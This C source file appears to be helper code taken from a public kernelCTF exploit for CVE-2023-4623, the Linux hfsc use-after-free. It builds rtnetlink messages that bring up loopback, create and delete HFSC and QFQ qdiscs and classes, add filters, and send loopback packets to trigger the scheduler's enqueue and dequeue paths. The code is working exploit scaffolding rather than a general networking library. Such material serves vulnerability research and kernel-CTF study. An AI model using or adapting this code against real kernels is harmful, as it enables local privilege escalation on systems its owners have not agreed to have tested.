#include "net.h"
/*
    Functions from kCTF public exp cve-2023-4623:
*/

/*
 * Send a Netlink message and check for error
 */
void NLMsgSend (int sock, struct tf_msg *m) {
    struct {
        struct nlmsghdr nh;
        struct nlmsgerr ne;
    } ack;
    if (write(sock, m, m->nlh.nlmsg_len) == -1)
        err_exit("[-] NLMsgSend: failed to send");
    if (read(sock , &ack, sizeof(ack)) == -1)
        err_exit("[-] NLMsgSend: failed to read");
    if (ack.ne.error) {
        errno = -ack.ne.error;
        perror("[-] NLMsgSend: internal error");
    }
}
void NLMsgSend_noerr (int sock, struct tf_msg *m) {
    if (write(sock, m, m->nlh.nlmsg_len) == -1)
        err_exit("[-] NLMsgSend_noerr: write");
}


int initNL(){
    /* Netlink message for setting loopback up. */
    struct if_msg if_up_msg = {
        {
            .nlmsg_len = 32,
            .nlmsg_type = RTM_NEWLINK,
            .nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
        },
        {
            .ifi_family = AF_UNSPEC,
            .ifi_type = ARPHRD_NETROM,
            .ifi_index = 1,
            .ifi_flags = IFF_UP,
            .ifi_change = 1,
        },
    };
    // The code is doing `if lo up` and returns the nl_sock_fd
    int nl_sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (nl_sock_fd == -1)
        err_exit("[-] nl socket");
    if_up_msg.ifi.ifi_index = if_nametoindex("lo");
    NLMsgSend(nl_sock_fd, &if_up_msg);
    return nl_sock_fd;
}
/*
 * Send a message on the loopback device. Used to trigger qdisc enqueue and
 * dequeue functions.
 */
void loopbackSend (void) {
    struct sockaddr iaddr = { AF_INET };
    int inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);
    if (inet_sock_fd == -1)
        err_exit("[-] loopbackSend: inet socket");
    if (connect(inet_sock_fd, &iaddr, sizeof(iaddr)) == -1)
        err_exit("[-] loopbackSend: connect");
    if (write(inet_sock_fd, "", 1) == -1)
        err_exit("[-] loopbackSend: inet write");
    close(inet_sock_fd);
}

/* Trafic control for netlink */
void init_tf_msg (struct tf_msg *m) {
    // nlmsghdr
    m->nlh.nlmsg_len    = NLMSG_LENGTH(sizeof(m->tcm));
    m->nlh.nlmsg_type   = 0;    // Default Value
    // We need these flags since https://elixir.bootlin.com/linux/v6.11.8/source/net/netlink/af_netlink.c#L2540
    m->nlh.nlmsg_flags  = NLM_F_REQUEST | NLM_F_ACK; 
    m->nlh.nlmsg_seq    = 0;    // Default Value
    m->nlh.nlmsg_pid    = 0;    // Default Value

    // tcmsg
    m->tcm.tcm_family   = PF_UNSPEC;
    m->tcm.tcm_ifindex  = if_nametoindex("lo");
    m->tcm.tcm_handle   = 0;    // Default Value
    m->tcm.tcm_parent   = -1;   // Default Value for no parent
    m->tcm.tcm_info     = 0;    // Default Value
}

/* Helper functions for creating rtnetlink messages. */
unsigned short add_rtattr (struct rtattr *rta, unsigned short type, unsigned short len, char *data) {
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    return rta->rta_len;
}

struct tf_msg * hfscQdiscAdd(short defcls) {
    // Kernel Handler: function hfsc_init_qdisc
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    // -> Calling tc_modify_qdisc 
    init_tf_msg(m);
    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
    m->nlh.nlmsg_flags   |= NLM_F_CREATE;
    m->tcm.tcm_handle    = 1 << 16;
    m->tcm.tcm_parent    = -1;
    
    // Set TCA_KIND     
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    // Set TCA_OPTIONS for default class (https://elixir.bootlin.com/linux/v6.1.36/source/net/sched/sch_hfsc.c#L170)
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_OPTIONS, sizeof(defcls), &defcls));
    return m;
}
struct tf_msg * qdiscAdd(const char *name,u32 parent, u32 handle) {
    // Kernel Handler: function hfsc_init_qdisc
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    // -> Calling tc_modify_qdisc 
    init_tf_msg(m);
    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
    m->nlh.nlmsg_flags   |= NLM_F_CREATE;
    m->tcm.tcm_handle    = handle;
    m->tcm.tcm_parent    = parent;
    
    // Set TCA_KIND     
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen(name) + 1, name));
    return m;
}

struct tf_msg * hfscClassAdd(enum hfsc_class_flags type, u32 classid, u32 parentid){
    // Kernel Handler: function  hfsc_change_class
    /*
        hfsc_changeclass:
            - If the class exists, the function changes the attributes of the class
            - else, create a new class
    */
    /*
        parentid = 0 means q.root
    */
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    init_tf_msg(m);
    m->nlh.nlmsg_type       = RTM_NEWTCLASS;
    m->tcm.tcm_parent       = parentid;
    m->tcm.tcm_handle       = classid;
    m->nlh.nlmsg_flags      |= NLM_F_CREATE;
    m->nlh.nlmsg_len        += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    
    struct rtattr *opts     = (char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len);
    opts->rta_type          = TCA_OPTIONS;
    opts->rta_len           = RTA_LENGTH(0);
    // Default trafic control policy
    // TODO: Get from parameters
    int dist[3] = {1, 1, 1}; 
    if(type == HFSC_RSC)
        opts->rta_len += RTA_ALIGN(add_rtattr((char *)opts + opts->rta_len, TCA_HFSC_RSC, sizeof(dist), dist));
    else if(type == HFSC_FSC)
        opts->rta_len += RTA_ALIGN(add_rtattr((char *)opts + opts->rta_len, TCA_HFSC_FSC, sizeof(dist), dist));
    else{
        err_exit("[-] hfscClassAdd: not support");
        return -1;
    }
    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
    return m;
}


struct tf_msg * hfscClassDel(u32 classid){
    // Kernel Handler: function  hfsc_delete_class
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    init_tf_msg(m);
    m->nlh.nlmsg_type        = RTM_DELTCLASS;
    m->tcm.tcm_handle        = classid;
    return m;
}





struct tf_msg * qfqQdiscAdd() {
    // Kernel Handler: function hfsc_init_qdisc
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    // -> Calling tc_modify_qdisc 
    init_tf_msg(m);
    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
    m->nlh.nlmsg_flags   |= NLM_F_CREATE;
    m->tcm.tcm_handle    = 1<<16;
    m->tcm.tcm_parent    = -1;
    
    // Set TCA_KIND     
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
    return m;
}
struct tf_msg * qfqClassAdd(enum hfsc_class_flags type, u32 classid,u32 val){
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    init_tf_msg(m);
    m->nlh.nlmsg_type       = RTM_NEWTCLASS;
    m->tcm.tcm_parent       = 0;
    m->tcm.tcm_handle       = classid;
    m->nlh.nlmsg_flags      |= NLM_F_CREATE;
    m->nlh.nlmsg_len        += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
    
    struct rtattr *opts     = (char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len);
    opts->rta_type          = TCA_OPTIONS;
    opts->rta_len           = RTA_LENGTH(0);
    
    if(type == TCA_QFQ_LMAX)
        opts->rta_len += RTA_ALIGN(add_rtattr((char *)opts + opts->rta_len, TCA_QFQ_LMAX, sizeof(val), &val));
    else if(type == TCA_QFQ_WEIGHT)
        opts->rta_len += RTA_ALIGN(add_rtattr((char *)opts + opts->rta_len, TCA_QFQ_WEIGHT, sizeof(val), &val));
    else{
        err_exit("[-] qfqClassAdd: not support");
        return -1;
    }
    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
    return m;
}
#include <linux/pkt_sched.h>
#include <linux/pkt_cls.h>
#include <netinet/in.h>
#include <arpa/inet.h>

struct tf_msg *qfqFilterAdd(unsigned short prio) {
    struct tf_msg *m = calloc(1, sizeof(struct tf_msg));
    init_tf_msg(m); // Initialize the tf_msg structure
    m->nlh.nlmsg_type   = RTM_NEWTFILTER;
    m->nlh.nlmsg_flags |= NLM_F_CREATE | NLM_F_EXCL;
    m->tcm.tcm_info     = (prio << 16) | htons(ETH_P_IP); // Priority and protocol
    m->tcm.tcm_handle   = 0;
    m->tcm.tcm_parent   = 0;

    // Add filter kind (e.g., rsvp)
    m->nlh.nlmsg_len += NLMSG_ALIGN(
        add_rtattr((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("basic") + 1, "basic")
    );

    // Add TCA_OPTIONS for filter rules
    struct rtattr *opts = (struct rtattr *)((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len));
    opts->rta_type = TCA_OPTIONS;
    opts->rta_len = RTA_LENGTH(0);

      // Add flowid to link this filter to a specific class
    unsigned int flowid = 0x10001; // Example flowid
    opts->rta_len += RTA_ALIGN(
        add_rtattr((char *)opts + RTA_ALIGN(opts->rta_len), TCA_BASIC_CLASSID, sizeof(flowid), &flowid)
    );

    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
    return m;
}